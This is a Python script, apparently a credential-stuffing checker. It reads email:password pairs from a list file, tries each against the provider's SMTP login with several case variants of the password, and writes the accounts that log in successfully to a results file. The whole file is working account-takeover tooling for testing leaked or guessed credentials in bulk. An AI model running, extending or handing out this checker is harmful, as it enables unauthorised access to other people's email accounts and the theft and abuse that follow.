#!/usr/bin/env python3
"""Email Credential Validator - SMTP Test (Fast & Reliable)"""

import sys, re, time, smtplib, socket
from pathlib import Path
from datetime import datetime
from typing import Tuple, Optional, Dict
from config import get_provider_config, TIMEOUTS, LOG_LEVEL, HIDE_PASSWORDS

class EmailValidator:
    def __init__(self, input_file: str = "list.txt", output_file: str = "results.txt"):
        self.input_file = Path(input_file)
        self.output_file = Path(output_file)
        self.results = []
        self.start_time = datetime.now()

    def log(self, level: str, message: str):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_levels = ["DEBUG", "INFO", "WARNING", "ERROR"]
        if log_levels.index(level) >= log_levels.index(LOG_LEVEL):
            msg = message
            if HIDE_PASSWORDS:
                msg = re.sub(r'[\w\.\-\+]+@[\w\.\-]+:[\w\.\-\+\!\@\#\$\%\&]+', '***:***', msg)
            print(f"[{timestamp}] [{level}] {msg}")

    @staticmethod
    def _password_variants(pwd: str) -> list:
        """Generate password case variants."""
        return list(dict.fromkeys([pwd, pwd.lower(), pwd.upper(), pwd.capitalize()]))

    @staticmethod
    def validate_email(email: str) -> Tuple[bool, Optional[str]]:
        if not re.match(r'^[a-zA-Z0-9._\-+]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
            return False, None
        return True, email.split('@')[1].lower().strip()

    def test_smtp(self, email: str, password: str, host: str, port: int) -> str:
        """Test SMTP credentials. Returns VALID/INVALID/ERROR."""
        try:
            smtp = smtplib.SMTP(host, port, timeout=TIMEOUTS["connect"])
            try:
                smtp.starttls(timeout=TIMEOUTS["connect"])
                for pwd in self._password_variants(password):
                    try:
                        smtp.login(email, pwd)
                        elapsed = (datetime.now() - self.start_time).total_seconds()
                        self.log("INFO", f"✓ VALID - {email}")
                        return "VALID"
                    except smtplib.SMTPAuthenticationError:
                        continue
                    except smtplib.SMTPException:
                        continue
                self.log("WARNING", f"✗ INVALID - {email}")
                return "INVALID"
            finally:
                try: smtp.quit()
                except: pass
        except Exception as e:
            self.log("ERROR", f"? ERROR - {email} - {type(e).__name__}")
            return "ERROR"

    def parse_line(self, line: str) -> Optional[Tuple[str, str]]:
        line = line.strip()
        if not line or line.startswith('#') or ':' not in line:
            return None
        parts = line.rsplit(':', 1)
        return tuple(p.strip() for p in parts) if len(parts) == 2 and all(parts) else None

    def run(self):
        """Execute validation."""
        self.log("INFO", "=" * 70)
        self.log("INFO", "Email Credential Validator - SMTP Test")
        self.log("INFO", "=" * 70)

        if not self.input_file.exists():
            self.log("ERROR", f"File not found: {self.input_file}")
            return False

        creds = [c for c in (self.parse_line(l) for l in open(self.input_file)) if c]

        if not creds:
            self.log("WARNING", "No valid credentials found")
            return False

        self.log("INFO", f"Found {len(creds)} account(s) to test\n")

        for idx, (email, pwd) in enumerate(creds, 1):
            self.log("INFO", f"[{idx}/{len(creds)}] Testing...")
            is_valid, domain = self.validate_email(email)

            if not is_valid:
                self.results.append({"email": email, "status": "ERROR"})
                continue

            cfg = get_provider_config(domain)
            if not cfg:
                self.results.append({"email": email, "domain": domain, "status": "ERROR"})
                continue

            self.log("INFO", f"  Domain: {domain} -> {cfg['description']}")
            status = self.test_smtp(email, pwd, cfg['smtp_host'], cfg['smtp_port'])
            self.results.append({"email": email, "domain": domain, "status": status, "provider": cfg['description']})
            time.sleep(0.5)

        self.write_results()
        return True

    def write_results(self):
        valid = [r for r in self.results if r['status'] == 'VALID']
        invalid = [r for r in self.results if r['status'] == 'INVALID']
        error = [r for r in self.results if r['status'] == 'ERROR']

        with open(self.output_file, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("Email Credential Validator Results\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 70 + "\n\n")

            if valid:
                f.write(f"✓ VALID ({len(valid)}):\n")
                for r in valid:
                    f.write(f"  {r['email']}\n")

            if invalid:
                f.write(f"\n✗ INVALID ({len(invalid)}):\n")
                for r in invalid:
                    f.write(f"  {r['email']}\n")

            if error:
                f.write(f"\n? ERROR ({len(error)}):\n")
                for r in error:
                    f.write(f"  {r['email']}\n")

            elapsed = (datetime.now() - self.start_time).total_seconds()
            f.write(f"\n{'='*70}\n")
            f.write(f"Total: {len(self.results)} | Valid: {len(valid)} | Invalid: {len(invalid)} | Error: {len(error)}\n")
            f.write(f"Duration: {elapsed:.2f}s\n")

        self.log("INFO", f"Results written to: {self.output_file}")
        print(f"\n{'='*70}\nSUMMARY: {len(valid)} VALID | {len(invalid)} INVALID | {len(error)} ERROR\n{'='*70}")

def main():
    if "-l" in sys.argv or "--list" in sys.argv:
        from config import list_providers
        list_providers()
        return

    validator = EmailValidator(
        sys.argv[1] if len(sys.argv) > 1 else "list.txt",
        sys.argv[2] if len(sys.argv) > 2 else "results.txt"
    )
    validator.run()

if __name__ == "__main__":
    main()
